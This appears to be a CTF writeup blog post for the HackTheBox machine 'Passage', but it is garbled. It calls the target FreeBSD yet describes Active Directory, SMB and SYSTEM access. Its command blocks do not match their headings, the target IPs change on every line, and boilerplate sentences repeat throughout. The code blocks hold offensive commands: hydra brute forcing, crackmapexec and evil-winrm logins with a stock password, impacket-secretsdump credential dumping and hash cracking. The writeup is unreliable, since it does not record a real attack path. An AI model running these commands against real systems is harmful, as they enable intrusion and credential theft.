---
TitleSEO: "HackTheBox — Passage (Hard FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Passage (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Passage. SUID Binary and LXD Privilege Escalation to achieve hard compromise on FreeBSD."
Keywords: "windows, tryhackme, offsec, linux, hackthebox, reversing"
URL: "https://zurefx.github.io/writeups/htb-passage-198.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-passage-198/"
Date: "2024-10-26"
Tags: "Windows, TryHackMe, OffSec, Linux, HackTheBox, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-passage-198"
Permalink: "/writeups/htb-passage-198.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Passage** is rated **Hard** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.76.40.139`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.109.199/FUZZ
crackmapexec smb 10.69.249.217 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.64.212 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

Key finding: **LXD Privilege Escalation**.

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p53,139,1433 10.115.144.94 -oN scan.txt
evil-winrm -i 10.52.156.148 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.51.104.102 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
crackmapexec smb 10.93.213.210 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p25,5986,8888 10.29.30.206 -oN scan.txt
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.195.105
crackmapexec smb 10.56.178.212 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.12.167
```

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `sharphound`
- `GetUserSPNs`
- `john`
- `lookupsid`
- `nmap`
- `rubeus`
- `hydra`

### Key Takeaways

- SUID Binary
- LXD Privilege Escalation
- Remote File Inclusion
